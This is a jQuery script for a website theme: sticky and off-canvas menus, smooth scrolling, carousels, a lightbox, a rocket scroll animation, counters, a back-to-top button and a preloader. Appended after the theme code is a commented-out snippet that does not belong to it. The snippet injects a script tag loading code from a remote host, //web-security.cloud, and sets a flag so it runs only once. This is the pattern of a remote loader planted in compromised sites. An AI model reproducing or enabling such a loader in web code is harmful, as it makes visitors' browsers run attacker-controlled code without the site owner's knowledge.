jQuery(function ($) {

	'use strict';



	// -------------------------------------------------------------
    // Sticky Menu
    // -------------------------------------------------------------
	    
        function stickMenu() {
            if ($(".navbar").length) {
                var nav = $('.navbar'),
                    scrolled = false,
                    top = $(window).scrollTop();

                if (110 < top && !scrolled) {
                    nav.addClass('sticky ');
                    scrolled = true;
                } else {
                    nav.removeClass('sticky ');
                    scrolled = false;
                }
            }
        }



    // -------------------------------------------------------------
    //  	Offcanvas Menu
    // -------------------------------------------------------------

        $(".menu-toggle").on("click" ,function(){
            $("#offcanvas-menu").addClass("toggled");
            return false;
        });

        $(".close-menu").on("click" ,function() {
            $("#offcanvas-menu").removeClass("toggled");
            return false;
        });



    // -------------------------------------------------------------
    //      Single-Page-Menu-Scrolling  Easy Plugin
    // -------------------------------------------------------------

        function singlePageScroll() {
            $('a.page-scroll').on('click', function(event) {
                var $anchor = $(this);
                $('html, body').stop().animate({
                     scrollTop: $($anchor.attr('href')).offset().top 
                }, 1500, 'easeInOutExpo');
                event.preventDefault();
            });
        }



    // -------------------------------------------------------------
    // Sub-menu
    // -------------------------------------------------------------
        if ( $('.dropmenu').length) {
            $('.dropmenu').on("click" ,function(){
                $(this).parent().find('ul').slideToggle();
                return false;
            });
        }

        



    // -------------------------------------------------------------
    //      Testimonial Crrousel
    // -------------------------------------------------------------
        if ( $('#testimonial-carousel-one').length) {
            $('#testimonial-carousel-one').carousel({
                interval: 0
            })
        }



    // -------------------------------------------------------------
    //      LightBox-Js
    // -------------------------------------------------------------

        if ($('#lightBox').length) {
            $('#lightBox').poptrox({
                usePopupCaption: true,
                usePopupNav: true,
                popupPadding: 0
            });
        }



    // -------------------------------------------------------------
    //      Main-Page Rocket
    // -------------------------------------------------------------
        function setRocketSectionHeight() {
            var height = $(window).height();
            $(".main-rocket").height((height - $(".header-section-one .navbar").height()) * 1.2);
        }


        function scrollRocket() {
            if ($(".homePageOne").length) {
                var cloud = $(".cloud");
                var headerSection = $(".header-content");
                var $rocket = $('.animated-rocket');
                var $win = $(window);
                var top = $win.scrollTop();
                var targetOffset = $(".animated-rocket").offset().top;
                var to = $win.scrollTop() / -1.5;

                $rocket.css('transform', 'translateY(' + to + 'px)');
                
                var height = $(window).height();
                
                $(".main-rocket").height((height-$(".header-section-one").height())*3);

                if (top - 320 >= targetOffset) {
                    cloud.css({
                        "display": "none"
                    }); 

                    headerSection.css({
                        "position": "absolute",
                        "opacity": 0,
                        "z-index": -99
                    })

                } else {
                    cloud.css({
                        "display": "block"
                    }); 

                    headerSection.css({
                        "position": "fixed",
                         "opacity": 1,
                         "z-index": 1500
                    })
                }
            }
        }
       




    // -------------------------------------------------------------
    //  	Client-Slider
    // -------------------------------------------------------------

        if ($('.client-carousel').length) {
            $('.client-carousel').owlCarousel({
                loop:true,
                autoplay:true,
                margin:10,
                autoplayTimeout: 2000,
                smartSpeed: 1000,
                autoplayHoverPause: true,
                /*nav:true,*/
                responsive:{
                    0:{
                        items:1,
                        nav:false,
                    },
                    600:{
                        items:3,
                        nav:false,
                    },
                    1000:{
                        items:6
                    }
                }
            });
        }



    //-------------------------------------------------------
    //  	counter Section
    //-------------------------------------------------------
       
        function funFactCounting() {
            if ($('.counting-section').length) {
                $('.counting-section').on('inview', function(event, visible, visiblePartX, visiblePartY) {
                    if (visible) {
                        $(this).find('.timer').each(function () {
                            var $this = $(this);
                            $({ Counter: 0 }).animate({ Counter: $this.text() }, {
                                duration: 2000,
                                easing: 'swing',
                                step: function () {
                                    $this.text(Math.ceil(this.Counter));
                                }
                            });
                        });
                    }
                });
            }
        }



    // -------------------------------------------------------------
    // Back To Top
    // -------------------------------------------------------------

        function backToTopBtnAppear() {
            if ($("#toTop").length) {
                var windowpos = $(window).scrollTop(),
                    backToTopBtn = $("#toTop");

                if (windowpos > 300) {
                    backToTopBtn.fadeIn();
                } else {
                   backToTopBtn.fadeOut();
                }
            }
        }

        function backToTop() {
            if ($("#toTop").length) {
                var backToTopBtn = $("#toTop");
                backToTopBtn.on("click", function() {
                    $("html, body").animate({
                        scrollTop: 0
                    }, 1000);
                    
                    return false;
                })
            }
        }




	// -------------------------------------------------------------
    // 		Preloader
    // -------------------------------------------------------------

        function preloader() {
            if ($('#preloader').length) {
                $('#preloader').delay(100).fadeOut('slow');
            }
        }



    // -------------------------------------------------------------
    //      WHEN WINDOW LOAD
    // -------------------------------------------------------------

        $(window).on("load", function() {

            backToTop();

            preloader();

            new WOW().init();

            funFactCounting();

            setRocketSectionHeight();

        })



    // -------------------------------------------------------------
    //      WHEN WINDOW SCROLL
    // -------------------------------------------------------------
        $(window).on("scroll", function() {

            stickMenu();

            backToTopBtnAppear();

            scrollRocket();

            singlePageScroll();

        });

});   // Jquery-End
/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/